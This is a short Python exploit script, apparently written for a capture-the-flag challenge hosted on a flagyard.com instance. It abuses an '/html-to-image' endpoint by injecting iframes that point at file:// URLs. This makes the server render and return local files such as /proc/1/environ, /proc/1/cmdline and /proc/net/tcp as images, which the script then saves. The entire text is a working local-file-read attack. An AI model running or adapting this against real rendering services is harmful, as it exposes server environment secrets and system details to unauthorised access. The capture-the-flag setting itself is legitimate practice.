import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def readfile(path, name, w=1500, h=1700):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    html = f'<iframe src="file://{path}" style="width:{w}px;height:{h}px;border:0"></iframe>'
    for attempt in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=45)
            if r.status_code == 200 and r.headers.get('Content-Type','').startswith('application/zip'):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    data = z.read(n)
                    out = f'f:/mission-git-hackss/mission-git-hackss/r2_{name}.jpg'
                    with open(out, 'wb') as f: f.write(data)
                    print(f'{name} ({path}): {len(data)} bytes')
                return
            print(f'{name} ({path}): [{r.status_code}] {r.text[:120]}')
            return
        except Exception:
            time.sleep(2)
    print(f'{name}: failed')

for path, name in [
    ('/proc/1/cmdline', 'cmdline'),
    ('/proc/1/environ', 'environ'),
    ('/proc/1/cwd/', 'cwd'),
    ('/proc/net/tcp', 'net_tcp'),
]:
    readfile(path, name)
    time.sleep(1)
